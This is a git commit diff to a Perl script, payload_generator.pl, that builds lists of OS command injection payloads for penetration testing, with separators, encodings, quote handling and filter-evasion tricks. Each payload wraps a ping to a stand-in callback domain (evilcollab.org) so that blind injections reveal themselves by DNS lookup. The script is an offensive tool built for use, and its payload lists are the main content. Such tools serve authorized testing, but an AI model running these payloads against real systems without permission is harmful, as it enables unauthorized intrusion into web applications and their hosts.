77e3f08e135ecfc04054db8d45fa36f06ea56f52
Julian Horoszkiewicz <ewilded@gmail.com>
2016-07-14 16:19:17 +0200

    Update payload_generator.pl
    Added another syntax-case, got rid of some redundant (broken) payloads, added few optimisations.

--- payload_generator.pl
+++ payload_generator.pl
@@ -6,7 +6,7 @@ use strict;
 
 # CONFIGURATION SECTION START
 my $COMMAND='ping';
-my $ARGUMENT='xPAYLOAD_MARK.lookup.evilcollab.domain';
+my $ARGUMENT='xPAYLOAD_MARK.sub.evilcollab.org';
 # in this configuration example we are trying to ravage file upload mechanism in order to write arbitrary files to arbitrary location
 my $PAYL=$COMMAND.'ARGUMENT_SEPARATOR'.$ARGUMENT;
 my $payload_marking=1; # if  we want to mark each payload with a unique identifier, so we can know the winner when it hits the right place
@@ -28,6 +28,7 @@ my $payload_marking=1; # if  we want to mark each payload with a unique identifi
 # 5) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX (for simple injections like cat $USER_SUPPLIED something, with filtering like \w+$)
 # 6) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR (for injections with shitty filtering like ^\w+ and some appended fixed shite, like cat $USER_SUPPLIED something)
 # 7) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX (for injections with appended fixed shite, like cat $USER_SUPPLIED something, with shitty filtering like ^\w+\s+.*\w+$)
+# 8) PREFIX+MALICIOUS_COMMAND+SUFFIX (`` and $() notations)
 
 # Why we do not combine COMMAND_SEPARATORS along with COMMAND_TERMINATORS in one payload: any quotes will be handled by the prefix stuff anyway, while any fixed appendices will be ignored due to separators instead of terminators (and if separator is not accepted, the command will fail anyway, so there is no point in trailing it with a terminator)... hence, terminators should be used only mutually exclusively with separators!
 
@@ -35,6 +36,9 @@ my $payload_marking=1; # if  we want to mark each payload with a unique identifi
 ## Bad character avoidance; there have to be some alternative payloads evading filters for particular characters; for instance "ping shell.a.pentest.co" might fail if "." is not allowed; while "ping $((base64 -d c2hlbGwuYS5wZW50ZXN0LmNvLnVrCg==))" would work otherwise (provided that its other characers are not blocked ofc), it's just an example; we need to develop some sort of bad character evasion like in meterpreter encoder ;)
 # Additional evasive versions, e.g. double url-encode (or overlong utf) non-word characters (ARGUMENT_SEPARATORS, COMMAND_SEPARATORS, COMMAND_TERMINATORS)
 # WINDOWS SUPPORT
+# support for nested-quote injections ('" and "' prefix-suffix)
+# Generate test cases FROM the payloads
+
 
 my @BASE_PAYLOADS=(
 $PAYL,
@@ -42,14 +46,14 @@ $PAYL,
 '`'.$PAYL.'`'
 );
 
-my @ARGUMENT_SEPARATORS=('  ',"\t\t",'$IFS$9');
+my @ARGUMENT_SEPARATORS=('%20%20',"%09%09",'$IFS$9');
 my @COMMAND_SEPARATORS=('%0a%0a','%0d%0d',';','%26','|','<<D%0aD%0a');
 my @COMMAND_TERMINATORS=("%00",'💩');# these make sense only if the command is saved into a file (script) or a database entry before being executed (in order to get rid of the hardcoded command shite if separators fail to get rid of its impact, or if dealing with some quoted injection
 
 # %F0%9F%92%A9 encoded poo
 
-my @SUFFIXES=('invvvvv212.org','1','foo'); # example.org for command injection into overlays of tools like whois. On the flip side, for file uploads these could be '.PNG', '.TXT','.DOC'optional list of suffixes to try (e.g. in order to bypass filters), used only with terminators
-my @PREFIXES=('invvvvv212.org','1','foo');
+# invvvvv212.org','1', example.org for command injection into overlays of tools like whois. On the flip side, for file uploads these could be '.PNG', '.TXT','.DOC'optional list of suffixes to try (e.g. in order to bypass filters), used only with terminators
+my @PREFIXES=('fooo.co.uk');
 my @PREFIX_SUFFIXES=('"',"'"); # for into-quoted string injections, like fixed_command '$USER_SUPPLIED' or fixed_command "$USER_SUPPLIED"
 
 # my %EVASIVE_RULES = (); # this is a collection of rules to apply in order to create alternative payload versions intended to bypass filters, e.g. 'script' => 'sCrIpt', 'script' => 'scr<script>ipt', 'UNION'=>'SeLunionect', 'tmp/' => 'tmp/../tmp/../tmp/../tmp/../tmp' and so on.
@@ -121,8 +125,9 @@ foreach my $base_payload(@BASE_PAYLOADS)
 {
 	foreach my $command_separator(@COMMAND_SEPARATORS)
 	{		
-		foreach my $suffix(@SUFFIXES)
+		foreach my $suffix(@PREFIXES) # prefix and suffix are the same 
 		{
+			next if($suffix=~/'/||$suffix=~/"/); # skip irrelevant payloads
 			my $curr_payload=$command_separator.$base_payload.$command_separator.$suffix;
 			push(@output_payloads,$curr_payload);	
 		}
@@ -137,8 +142,15 @@ foreach my $base_payload(@BASE_PAYLOADS)
 		foreach my $prefix(@PREFIXES)
 		{
 			my $curr_payload=$prefix.$command_separator.$base_payload.$command_separator;
-			$curr_payload.="'"	if($curr_payload=~/'/); 
-			$curr_payload.='"'	if($curr_payload=~/"/); # if the payload starts with a quote, we are closing it with the same quote in order to keep the syntax from breaking
+			if($curr_payload=~/'/)
+			{
+				$curr_payload.="'";
+			}
+			elsif($curr_payload=~/"/)
+			{
+				$curr_payload.='"';
+			}
+			# if the payload starts with a quote, we are closing it with the same quote in order to keep the syntax from breaking
 			push(@output_payloads,$curr_payload);
 		}
 	}
@@ -149,20 +161,26 @@ foreach my $base_payload(@BASE_PAYLOADS)
 {
 	foreach my $command_separator(@COMMAND_SEPARATORS)
 	{
-		foreach my $suffix(@SUFFIXES)
+		foreach my $prefix(@PREFIXES)
 		{
-			foreach my $prefix(@PREFIXES)
-			{
-				my $curr_payload=$prefix.$command_separator.$base_payload.$command_separator.$suffix;
-				$curr_payload.="'"	if($curr_payload=~/'/); 
-				$curr_payload.='"'	if($curr_payload=~/"/); # if the payload starts with a quote, we are closing it with the same quote in order to keep the syntax from breaking
-				push(@output_payloads,$curr_payload);
-			}
+			my $curr_payload=$prefix.$command_separator.$base_payload.$command_separator.$prefix; # suffix is the same as prefix
+			# if the payload starts with a quote, we are closing it with the same quote in order to keep the syntax from breaking
+			push(@output_payloads,$curr_payload);
 		}
-
 	}
 }
 
+# 8) PREFIX+MALICIOUS_COMMAND+SUFFIX (`` and $() notations)
+foreach my $base_payload(@BASE_PAYLOADS)
+{
+	if(!($base_payload=~/^\`/) && !($base_payload=~/^\$/)) { next; } # skip irrelevant base payloads in order to avoid pointless results
+	foreach my $prefix(@PREFIXES)
+	{
+			my $curr_payload=$prefix.$base_payload.$prefix; # suffix is the same as prefix
+			# if the payload starts with a quote, we are closing it with the same quote in order to keep the syntax from breaking
+			push(@output_payloads,$curr_payload);
+	}
+}
 
 # FINALLY, PRINT OUR PRECIOUS LIST READY FOR ACTION!
 my $cnt=0;
